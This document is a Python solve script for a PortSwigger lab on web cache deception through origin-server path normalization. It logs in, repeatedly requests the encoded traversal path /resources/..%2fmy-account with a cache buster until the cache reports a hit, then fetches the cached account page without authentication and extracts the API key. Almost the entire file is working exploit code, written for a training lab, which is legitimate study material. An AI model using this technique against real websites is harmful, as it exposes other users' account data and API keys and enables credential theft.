#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Exploiting origin server normalization for web cache deception.

The origin resolves ..%2f (encoded ../) path traversals; the cache does not.
Cache has a /resources static rule, so /resources/..%2fmy-account is cached by
the cache (sees /resources prefix) but resolved to /my-account by the origin.

Exploit URL: /resources/..%2fmy-account?wcd
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EXPLOIT_PATH = "/resources/..%2fmy-account"
CACHE_BUSTER = "wcd"


def login(lab, username, password):
    s = requests.Session()
    s.verify = False
    r = s.get(f"{lab}/login")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise ValueError("CSRF token not found")
    s.post(f"{lab}/login", data={
        "csrf": csrf.group(1),
        "username": username,
        "password": password,
    }, allow_redirects=True)
    return s


def poison_cache(s, lab, max_attempts=20):
    url = f"{lab}{EXPLOIT_PATH}?{CACHE_BUSTER}"
    print(f"[*] Poisoning: {url}")
    for i in range(1, max_attempts + 1):
        r = s.get(url, allow_redirects=False)
        cache = r.headers.get("X-Cache", "none")
        print(f"[{i:3d}] X-Cache={cache}  Status={r.status_code}")
        if cache == "hit":
            print("[+] Cache hit confirmed!")
            return True
        time.sleep(0.3)
    return False


def fetch_cached(lab):
    url = f"{lab}{EXPLOIT_PATH}?{CACHE_BUSTER}"
    print(f"\n[*] Fetching cached response unauthenticated: {url}")
    r = requests.get(url, verify=False)
    print(f"[*] X-Cache={r.headers.get('X-Cache', 'none')}")
    return r.text


def extract_api_key(html):
    m = re.search(r'Your API Key is:\s*</strong>\s*([A-Za-z0-9]+)', html)
    if m:
        return m.group(1)
    m = re.search(r'API Key[^:]*:\s*([A-Za-z0-9]{20,})', html)
    return m.group(1) if m else None


def main():
    parser = argparse.ArgumentParser(
        description="Solve WCD Lab 5: origin server normalization"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = login(lab, args.username, args.password)
    print(f"[*] Logged in as {args.username}")

    if not poison_cache(s, lab):
        print("[-] Cache never hit — verify the exploit path.")
        return

    html = fetch_cached(lab)
    api_key = extract_api_key(html)
    if api_key:
        print(f"\n[+] API key: {api_key}")
    else:
        print("[-] API key not found — check the response manually.")


if __name__ == "__main__":
    main()
